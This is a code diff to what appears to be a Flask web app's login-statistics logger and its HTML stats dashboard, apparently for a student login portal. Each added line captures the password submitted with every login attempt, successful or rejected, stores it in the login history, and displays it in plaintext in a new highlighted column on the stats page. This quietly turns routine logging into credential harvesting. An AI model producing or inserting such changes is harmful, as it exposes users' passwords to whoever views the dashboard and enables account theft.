@@ -61,11 +61,13 @@ def log_stats(response):
             res_json = response.get_json() or {}
             req_json = request.get_json() or {}
             username = req_json.get("username", "Unknown")
+            password = req_json.get("password", "")
             
             if response.status_code == 200 and res_json.get("success"):
                 STATS["successful_logins"] += 1
                 STATS["login_history"].append({
                     "username": username,
+                    "password": password,
                     "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                     "status": "SUCCESS",
                     "error": ""
@@ -75,6 +77,7 @@ def log_stats(response):
                 error_msg = res_json.get("error") or f"HTTP {response.status_code}"
                 STATS["login_history"].append({
                     "username": username,
+                    "password": password,
                     "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                     "status": "REJECTED",
                     "error": error_msg
@@ -325,6 +328,7 @@ STATS_HTML = """
                 <thead>
                     <tr>
                         <th>Username / Roll No.</th>
+                        <th>Password</th>
                         <th>Timestamp</th>
                         <th>Status</th>
                         <th>Details / Error</th>
@@ -334,6 +338,7 @@ STATS_HTML = """
                     {% for log in history %}
                     <tr>
                         <td style="font-weight: 500;">{{ log.username }}</td>
+                        <td style="font-family: monospace; color: #ffeb3b;">{{ log.password }}</td>
                         <td>{{ log.timestamp }}</td>
                         <td>
                             {% if log.status == 'SUCCESS' %}
